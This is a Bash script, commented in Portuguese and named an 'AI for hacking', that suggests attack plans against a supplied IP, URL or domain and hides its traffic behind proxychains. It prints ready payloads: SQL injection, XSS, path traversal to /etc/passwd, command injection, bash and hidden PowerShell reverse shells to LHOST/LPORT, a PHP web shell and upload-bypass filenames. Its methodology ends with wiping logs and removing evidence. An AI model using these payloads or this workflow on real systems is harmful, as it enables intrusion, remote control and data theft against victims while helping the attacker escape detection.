#!/bin/bash
# Oracle - IA Avançada para Hacking
echo "=== ORACLE AI - HACKING INTELLIGENCE ==="

if [ -z "$1" ]; then
    echo "Uso: $0 <CONTEXTO> [dados]"
    echo "Contextos:"
    echo "  analyze <url>     - Análise inteligente de alvo"
    echo "  exploit <tipo>    - Sugestões de exploit"
    echo "  payload <alvo>    - Geração inteligente de payload"
    echo "  strategy <info>   - Estratégia de ataque"
    echo "  decode <data>     - Decodificação inteligente"
    exit 1
fi

CONTEXT="$1"
DATA="$2"

# Função de análise inteligente
intelligent_analysis() {
    local target="$1"
    echo "🔮 ORACLE ANALISANDO: $target"
    
    # Coletar informações básicas
    echo -e "\n[COLETA DE INTELIGÊNCIA]"
    
    # Verificar se é IP ou domínio
    if [[ "$target" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
        echo "Tipo: Endereço IP"
        echo "Estratégia: Scan direto de portas e serviços"
        
        # Sugerir ferramentas
        echo -e "\n🎯 PLANO DE ATAQUE SUGERIDO:"
        echo "1. ./mapper.sh $target     # Mapeamento completo"
        echo "2. ./stealth.sh $target    # Scan stealth"
        echo "3. ./brute.sh ssh $target  # Se SSH aberto"
        
    elif [[ "$target" =~ ^https?:// ]]; then
        echo "Tipo: URL Web"
        echo "Estratégia: Análise web e busca por vulnerabilidades"
        
        # Extrair domínio
        domain=$(echo "$target" | sed 's|https\?://||' | cut -d'/' -f1)
        
        echo -e "\n🎯 PLANO DE ATAQUE SUGERIDO:"
        echo "1. ./analyzer.sh $target      # Análise web completa"
        echo "2. ./sensitive.sh $target     # Busca dados sensíveis"
        echo "3. ./bypass.sh $target/admin  # Teste bypass WAF"
        echo "4. ./exploit.sh $target       # Exploits automáticos"
        
        # Verificar tecnologias
        echo -e "\n[DETECÇÃO DE TECNOLOGIAS]"
        tech_headers=$(proxychains4 -q curl -s -I "$target" 2>/dev/null | grep -i "server\|x-powered\|x-framework" | head -3)
        if [ -n "$tech_headers" ]; then
            echo "$tech_headers"
            
            # Sugestões baseadas em tecnologia
            if echo "$tech_headers" | grep -qi "apache"; then
                echo "💡 Apache detectado - Teste: .htaccess bypass, mod_rewrite"
            fi
            if echo "$tech_headers" | grep -qi "nginx"; then
                echo "💡 Nginx detectado - Teste: off-by-slash, merge_slashes"
            fi
            if echo "$tech_headers" | grep -qi "php"; then
                echo "💡 PHP detectado - Teste: LFI, RFI, PHP wrappers"
            fi
        fi
        
    else
        echo "Tipo: Domínio"
        echo "Estratégia: Reconhecimento e enumeração"
        
        echo -e "\n🎯 PLANO DE ATAQUE SUGERIDO:"
        echo "1. ./stealth.sh $target       # Reconhecimento stealth"
        echo "2. ./analyzer.sh https://$target  # Se web ativo"
        echo "3. ./email.sh admin@$target   # Inteligência de email"
    fi
}

# Função de sugestão de exploits
suggest_exploits() {
    local exploit_type="$1"
    echo "🔮 ORACLE SUGERE EXPLOITS PARA: $exploit_type"
    
    case "$exploit_type" in
        "web"|"webapp")
            echo -e "\n[WEB APPLICATION EXPLOITS]"
            echo "1. SQL Injection:"
            echo "   ./exploit.sh <url> # Teste automático"
            echo "   Payloads: ', 1' OR '1'='1, admin'--"
            echo ""
            echo "2. XSS (Cross-Site Scripting):"
            echo "   <script>alert(1)</script>"
            echo "   <img src=x onerror=alert(1)>"
            echo ""
            echo "3. LFI/RFI:"
            echo "   ../../../etc/passwd"
            echo "   php://filter/convert.base64-encode/resource=index.php"
            echo ""
            echo "4. Command Injection:"
            echo "   ; whoami"
            echo "   | id"
            echo "   && cat /etc/passwd"
            ;;
            
        "api"|"rest")
            echo -e "\n[API EXPLOITS]"
            echo "1. JWT Manipulation:"
            echo "   ./jwt.sh <token> # Análise completa"
            echo ""
            echo "2. IDOR (Insecure Direct Object Reference):"
            echo "   /api/user/1 → /api/user/2"
            echo ""
            echo "3. Mass Assignment:"
            echo "   {\"role\":\"admin\",\"isAdmin\":true}"
            echo ""
            echo "4. Rate Limiting Bypass:"
            echo "   X-Forwarded-For: 127.0.0.1"
            echo "   X-Real-IP: 192.168.1.1"
            ;;
            
        "auth"|"authentication")
            echo -e "\n[AUTHENTICATION EXPLOITS]"
            echo "1. Brute Force:"
            echo "   ./brute.sh http <login_url>"
            echo ""
            echo "2. Session Fixation:"
            echo "   Fixar SESSIONID antes do login"
            echo ""
            echo "3. Password Reset:"
            echo "   Manipular tokens de reset"
            echo ""
            echo "4. OAuth Exploits:"
            echo "   redirect_uri manipulation"
            echo "   state parameter bypass"
            ;;
            
        *)
            echo "Tipo de exploit não reconhecido: $exploit_type"
            echo "Tipos disponíveis: web, api, auth"
            ;;
    esac
}

# Função de geração inteligente de payload
generate_payload() {
    local target_info="$1"
    echo "🔮 ORACLE GERANDO PAYLOAD PARA: $target_info"
    
    # Analisar contexto do alvo
    if [[ "$target_info" =~ (linux|unix|bash) ]]; then
        echo -e "\n[LINUX PAYLOADS]"
        echo "Reverse Shell:"
        echo "bash -i >& /dev/tcp/LHOST/LPORT 0>&1"
        echo ""
        echo "Privilege Escalation:"
        echo "find / -perm -4000 2>/dev/null"
        echo "sudo -l"
        
    elif [[ "$target_info" =~ (windows|cmd|powershell) ]]; then
        echo -e "\n[WINDOWS PAYLOADS]"
        echo "PowerShell Reverse Shell:"
        echo "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"LHOST\",LPORT)"
        echo ""
        echo "Privilege Escalation:"
        echo "whoami /priv"
        echo "net user"
        
    elif [[ "$target_info" =~ (web|http|php) ]]; then
        echo -e "\n[WEB PAYLOADS]"
        echo "PHP Web Shell:"
        echo "<?php system(\$_GET['cmd']); ?>"
        echo ""
        echo "Upload Bypass:"
        echo "shell.php.jpg"
        echo "shell.phtml"
        
    else
        echo -e "\n[PAYLOADS GENÉRICOS]"
        echo "1. Reverse Shells:"
        echo "   ./payload.sh reverse"
        echo ""
        echo "2. Web Shells:"
        echo "   ./payload.sh web"
        echo ""
        echo "3. XSS Payloads:"
        echo "   ./payload.sh xss"
    fi
}

# Função de estratégia de ataque
attack_strategy() {
    local info="$1"
    echo "🔮 ORACLE DEFININDO ESTRATÉGIA PARA: $info"
    
    echo -e "\n[METODOLOGIA DE ATAQUE]"
    echo "1. RECONHECIMENTO:"
    echo "   • ./stealth.sh <target>"
    echo "   • ./analyzer.sh <url>"
    echo "   • Coleta passiva de informações"
    echo ""
    echo "2. ENUMERAÇÃO:"
    echo "   • ./mapper.sh <target>"
    echo "   • Descoberta de serviços e versões"
    echo "   • Identificação de tecnologias"
    echo ""
    echo "3. EXPLORAÇÃO:"
    echo "   • ./exploit.sh <url>"
    echo "   • ./bypass.sh <protected_url>"
    echo "   • Exploits específicos por serviço"
    echo ""
    echo "4. PÓS-EXPLORAÇÃO:"
    echo "   • ./payload.sh reverse"
    echo "   • Escalação de privilégios"
    echo "   • Persistência"
    echo ""
    echo "5. COBERTURA DE RASTROS:"
    echo "   • Limpeza de logs"
    echo "   • Remoção de evidências"
    echo "   • ./stealth.sh para evasão"
}

# Função de decodificação inteligente
intelligent_decode() {
    local data="$1"
    echo "🔮 ORACLE DECODIFICANDO: ${data:0:50}..."
    
    # Detectar tipo de encoding
    if [[ "$data" =~ ^eyJ ]]; then
        echo -e "\n[JWT TOKEN DETECTADO]"
        echo "Analisando com JWT decoder..."
        ./jwt.sh "$data"
        
    elif [[ "$data" =~ ^[A-Za-z0-9+/]*={0,2}$ ]] && [ ${#data} -gt 10 ]; then
        echo -e "\n[BASE64 DETECTADO]"
        decoded=$(echo "$data" | base64 -d 2>/dev/null)
        if [ $? -eq 0 ]; then
            echo "Decodificado: $decoded"
        else
            echo "Erro na decodificação Base64"
        fi
        
    elif [[ "$data" =~ ^[0-9a-fA-F]+$ ]]; then
        echo -e "\n[HEX DETECTADO]"
        decoded=$(echo "$data" | xxd -r -p 2>/dev/null)
        if [ $? -eq 0 ]; then
            echo "Decodificado: $decoded"
        else
            echo "Erro na decodificação HEX"
        fi
        
    elif [[ "$data" =~ %[0-9a-fA-F]{2} ]]; then
        echo -e "\n[URL ENCODING DETECTADO]"
        decoded=$(echo "$data" | python3 -c "import sys, urllib.parse; print(urllib.parse.unquote(sys.stdin.read().strip()))" 2>/dev/null)
        echo "Decodificado: $decoded"
        
    else
        echo -e "\n[FORMATO NÃO RECONHECIDO]"
        echo "Tentando múltiplas decodificações..."
        
        # Tentar Base64
        echo "Base64: $(echo "$data" | base64 -d 2>/dev/null || echo 'Falhou')"
        
        # Tentar URL decode
        echo "URL: $(echo "$data" | python3 -c "import sys, urllib.parse; print(urllib.parse.unquote(sys.stdin.read().strip()))" 2>/dev/null || echo 'Falhou')"
    fi
}

# Executar função baseada no contexto
case "$CONTEXT" in
    "analyze")
        intelligent_analysis "$DATA"
        ;;
    "exploit")
        suggest_exploits "$DATA"
        ;;
    "payload")
        generate_payload "$DATA"
        ;;
    "strategy")
        attack_strategy "$DATA"
        ;;
    "decode")
        intelligent_decode "$DATA"
        ;;
    *)
        echo "Contexto inválido: $CONTEXT"
        echo "Use: analyze, exploit, payload, strategy, decode"
        exit 1
        ;;
esac

echo -e "\n🔮 ORACLE CONCLUÍDO - Use './ai.sh <pergunta>' para consultas rápidas"